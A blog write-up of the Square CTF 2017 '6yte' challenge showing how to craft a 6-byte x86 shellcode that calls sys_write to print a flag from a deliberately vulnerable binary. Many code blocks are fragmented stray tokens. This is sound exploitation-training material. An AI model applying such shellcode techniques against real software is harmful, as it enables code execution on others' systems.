---
layout: post
title: "Square CTF writeup — 6yte"
date: 2017-10-08 05:36:08 +0000
categories: blog
---

### Square CTF writeup — 6yte

https://gybos-zavyd-gitod-sapas-rolig.capturethesquare.com/

Clearly, this challenge is not worthy 1000 points, it is actually pretty easy if you are familiar with x86 assembly.

Download the binary, and do a quick decompile, go through the main() function and read_flag() function, we can find out:

```
read_flag()
```

```
read_flag()
```

```
v5 = mmap(NULL, 6, 7, 33, -1, 0);    if (v2 == 0) {        // 0x8048889        printf("Shellcode location: %p\n", v5);        v4 = &v6;        printf("Flag location: %p\n", &v6);        sleep(1);        read_flag(v4);        g4 = v4;        g5 = 5;        g3 = 1;        g1 = 4;        ((int32_t (*)())v5)();        return 0;    }
```

So, all we need to do in our shellcode is display the flag saved in v4. Since we have to write assembly code, now let’s take a look at the corresponding assembly code:

```
v4
```

```
0x80488c9:   50                               push eax0x80488ca:   e8 1c fe ff ff                   call 0x80486eb <read_flag>0x80488cf:   83 c4 10                         add esp, 0x100x80488d2:   8d 85 68 ff ff ff                lea eax, dword [ ebp + 0xffffff68 ]0x80488d8:   89 c7                            mov edi, eax0x80488da:   ba 05 00 00 00                   mov edx, 0x50x80488df:   bb 01 00 00 00                   mov ebx, 0x10x80488e4:   b8 04 00 00 00                   mov eax, 0x40x80488e9:   ff 65 e8                         jmp dword [ ebp + 0xffffffe8 ]
```

So the C variable v4 is actually eax register, and the flag is right at the address saved in eax. How can we show it?

```
v4
```

```
eax
```

```
eax
```

My first thought is to call printf(), it is not hard at all to find a %2x string in this binary, however, it is hard to figure out the address of printf().

```
printf()
```

```
%2x
```

```
printf()
```

Then, the second thought is to call write() directly. Lookup the syscall table, I realize that this must be the right direction because eax and ebx are already set properly for us in the binary!! Look, eax is already 0x4 which the syscall number of sys_write(), ebx is 0x1 which is STDOUT… Hmm, so all we need to do is:

```
write()
```

```
eax
```

```
ebx
```

```
eax
```

```
0x4
```

```
ebx
```

```
STDOUT
```

```
ecx
```

```
buf
```

```
v4
```

```
edi
```

```
edx
```

```
count
```

```
int 0x80
```

Therefore we get this:

```
% rasm2 'mov edx, 0x40; mov ecx, edi; int 0x80'ba4000000089f9cd80
```

Clearly this is longer than 6 bytes… As we can see there are some unnecessary 0’s, also note that edx was already set to 0x5, this means we only have to set dh instead of the whole edx!

```
edx
```

```
0x5
```

```
dh
```

```
edx
```

So the final shellcode is:

```
% rasm2 'mov dh, 0x1; mov ecx, edi; int 0x80'b60189f9cd80
```

Challenge solved!